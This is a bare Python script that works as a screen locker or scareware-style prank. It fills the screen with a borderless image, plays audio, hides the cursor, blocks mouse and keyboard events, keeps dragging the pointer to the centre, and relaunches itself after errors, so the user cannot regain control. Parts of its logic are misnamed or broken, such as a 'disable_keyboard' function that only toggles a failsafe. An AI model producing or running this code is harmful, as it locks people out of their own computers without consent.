import tkinter as tk
import pygame
import os
import pyautogui
import subprocess
import threading
import time

def disable_keyboard():
    while True:
        pyautogui.FAILSAFE = False
        time.sleep(1)

def display_image(image_path, audio_path):
    pygame.init()

    screen_info = pygame.display.Info()
    screen_width, screen_height = screen_info.current_w, screen_info.current_h

    root = tk.Tk()
    root.overrideredirect(True)
    root.geometry(f"{screen_width}x{screen_height}+0+0")

    screen = pygame.display.set_mode((screen_width, screen_height), pygame.NOFRAME)

    image = pygame.image.load(image_path)
    image = pygame.transform.scale(image, (screen_width, screen_height))

    pygame.mouse.set_visible(False)
    pygame.event.set_blocked(pygame.MOUSEMOTION)
    pygame.event.set_blocked(pygame.MOUSEBUTTONDOWN)
    pygame.event.set_blocked(pygame.KEYDOWN)
    pygame.event.set_blocked(pygame.KEYUP)

    pygame.mixer.init()
    pygame.mixer.music.load(audio_path)
    pygame.mixer.music.play()

    while True:
        running = True
        while running:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    running = False

            screen.blit(image, (0, 0))
            pygame.display.flip()

            pyautogui.moveTo(screen_width // 2, screen_height // 2, duration=0)

        pygame.mixer.music.stop()
        pygame.quit()
        root.destroy()

def run_display_image(image_path, audio_path):
    while True:
        try:
            display_image(image_path, audio_path)
        except Exception as e:
            print(f"An error occurred: {e}")
        time.sleep(1) 

if __name__ == '__main__':
    image_path = 'assets/image.png'
    audio_path = 'assets/music.mp3'

    keyboard_thread = threading.Thread(target=disable_keyboard)
    keyboard_thread.daemon = True
    keyboard_thread.start()

    display_thread = threading.Thread(target=run_display_image, args=(image_path, audio_path))
    display_thread.daemon = True
    display_thread.start()

    while True:
        pass